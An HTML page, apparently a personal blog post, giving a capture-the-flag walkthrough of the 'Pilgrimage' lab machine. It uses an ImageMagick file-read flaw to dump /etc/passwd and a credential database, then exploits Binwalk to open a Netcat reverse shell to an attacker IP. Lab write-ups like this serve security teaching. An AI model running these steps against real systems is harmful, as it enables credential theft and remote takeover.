@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>Pilgrimage</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>Pilgrimage Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:600/format:webp/0*absD9_MO71zz6qe7.png">
+            <h2>Initial</h2>
+            <p class="paragraph">
+                As usual, let’s start off with an Nmap scan.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*5dAj238yuFwad_Qt45Rhbg.png">
+            <p class="paragraph">
+                Port 22 and 80, so this will be a regular web exploitation machine.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*7QAj4dL1Daj8AYVwFZlhbQ.png">
+            <p class="paragraph">
+                We need to add to /etc/hosts
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*tnlVntJvLaEEcw6bE9-n6Q.png">
+            <p class="paragraph">
+                Right away, we are given a file upload feature, which might have a file upload vulnerability. Additionally, we can register and log in.<br>I decided to start by registering and running SQLMap in the background to test for SQL Injection. Although I initially<br>tried uploading a PHP shell, it didn’t work. Consequently, I decided to continue the standard<br>enumeration process with Gobuster.<br><br>
+                There’s a .git directory; let’s try to dump the source code.<br><br>
+                Upon accessing the website, we can observe a file upload form that requests an image. When an image is uploaded, a link is generated in<br>the “/shrunk” path, which resizes the image.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*LGQ0EC8r4gPLu7-a">
+            <p class="paragraph">
+                Analyzing the code, it can be observed that it handles the upload and resizing of images on the website. It also verifies if the user is<br>authenticated and returns their username. If the request is a POST method and an image is sent for resizing, the code<br>processes the image, saves it to a specific location, and records the information in a database. Subsequently, the user is redirected to a<br>page displaying a success or failure message based on the result of the process.<br><br>
+                It is important to mention that the code utilizes ImageMagick, specifically the “magick convert” command, to perform the resizing of the<br>uploaded file and save it in the /shrunk path.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*GfbGoSelp0CF0XsL">
+            <p class="paragraph">
+                verifying the ImageMagick binary, it has been identified that it is in version 7.1.0–49, which has a known vulnerability called “Arbitrary<br>File Read”. This vulnerability allows an attacker to read system files.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*ntg4wE4W6zjVDk4o">
+            <p class="paragraph">
+                https://www.metabaseq.com/imagemagick-zero-days/<br><br>
+                https://github.com/voidz0r/CVE-2022-44268<br><br>
+                Following the Proof of Concept (PoC) we found in Rust, we can read files using the following steps. First, we generate a modified PNG file<br>that will allow us to upload it to the system. Once the file is downloaded, we can then read the contents of our /etc/passwd<br>file from that modified file.
+                <p class="script-container">
+                    cargo run "/etc/passwd"
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*Y-oD7rrHwv7muc0I">
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/0*VbxfqcZKkkCnc3uN">
+            <p class="paragraph">
+                using the “identify -verbose” command, we can obtain detailed information about the file in question. In this case, we will find a payload in<br>hexadecimal format. To decode it, we can use the tool CyberChef, which allows us to convert it to ASCII text.
+                <p class="script-container">
+                    identify -verbose 649756a97443a.png
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*C7XU4WDJQ6Mu1KIR">
+            <p class="paragraph">
+                https://gchq.github.io/CyberChef/
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*dNVEUgMycHwb_D-k">
+            <p class="paragraph">
+                exploiting the LFI vulnerability, we have successfully accessed and read system files, allowing us to discover the existence of a user named “Emily”.
+                <p class="script-container">
+                    root:x:0:0:root:/root:/bin/bash<br>
+                    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
+                    bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
+                    sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
+                    sync:x:4:65534:sync:/bin:/bin/sync<br>
+                    games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>
+                    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>
+                    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>
+                    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>
+                    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>
+                    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>
+                    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>
+                    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>
+                    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>
+                    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>
+                    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>
+                    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>
+                    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>
+                    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>
+                    systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>
+                    systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>
+                    messagebus:x:103:109::/nonexistent:/usr/sbin/nologin<br>
+                    systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>
+                    emily:x:1000:1000:emily,,,:/home/emily:/bin/bash<br>
+                    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>
+                    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>
+                    _laurel:x:998:998::/var/log/laurel:/bin/false<br>
+                </p>
+                If we analyze the dashboard.php file, we find SQL queries to a SQLite database located at /var/db/pilgrimage. We will attempt to<br>download it using a local file inclusion (LFI) vulnerability.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*SXzed_lN1XmraQA-">
+            <p class="script-container">
+                cargo run "/var/db/pilgrimage"
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*U6yqLBRu79pDzK1C">
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/0*g8YJmQGiwWFxUlQ3">
+            <p class="paragraph">
+                We have found login credentials for the user “Emily,” which allow us to establish an SSH connection using her account.
+            </p>
+            <h2>PE</h2>
+            <p class="paragraph">
+                using the pspy64 tool for privilege escalation, we discovered that the root user is executing a file named “malwarescan.sh.” Additionally,<br>we have read permissions for that file.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*2JVtPpaB8vh6XEvM">
+            <p class="paragraph">
+                The bash script monitors the directory /var/www/pilgrimage.htb/shrunk/ for newly created files and analyzes them for unwanted content using<br>binwalk. If it finds unwanted content in a file, it automatically removes it.<br><br>
+                COPY
+                <p class="script-container">
+                    #!/bin/bash<br>
+                    blacklist=("Executable script" "Microsoft executable")<br>
+                    /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do<br>
+                        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"<br>
+                        binout="$(/usr/local/bin/binwalk -e "$filename")"<br>
+                            for banned in "${blacklist[@]}"; do<br>
+                            if [[ "$binout" == *"$banned"* ]]; then<br>
+                                /usr/bin/rm "$filename"<br>
+                                break<br>
+                            fi<br>
+                        done<br>
+                    done<br>
+                </p>
+                The version of Binwalk found is 2.3.2, which has a vulnerability that allows arbitrary code execution. We will leverage this vulnerability to<br>escalate our access privileges.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*CA9Emjp467KHw6aq">
+            <p class="paragraph">
+                https://www.exploit-db.com/exploits/51249<br><br>
+                https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/<br><br>
+                We have found an exploit in Exploit-DB that allows us to generate a manipulated image using the Binwalk binary. By passing certain parameters to<br>the binary, we can execute commands on the target system or, in our case, generate a reverse shell using Netcat.<br>This technique provides us with the opportunity to gain remote access to the system and continue escalating our<br>privileges.<br><br>
+                COPY
+                <p class="script-container">
+                    python3 exploit.py  image.png 10.10.14.x 443
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*yHvIJI6ECqbytDAZ">
+            <p class="paragraph">
+                Once we have generated the manipulated image using the exploit, we need to upload it to the “/var/www/pilgrimage.htb/shrunk/” path on the target<br>server. Once the image is in place, we should start listening in Netcat to capture the incoming connection. This<br>will allow us to establish a reverse shell and gain access to the system.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*k_It7RrKHhG4TBXO">
+            <p class="paragraph">
+                Using pspy64 to monitor system activities, we observed that the command execution was successful, and we have managed to establish a reverse shell.            
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*n7DBYcX-ixipSogn">
+            <p class="paragraph">
+                following these steps, we have successfully compromised this machine.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/0*Y76A4fDKnXhVTaBL">
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
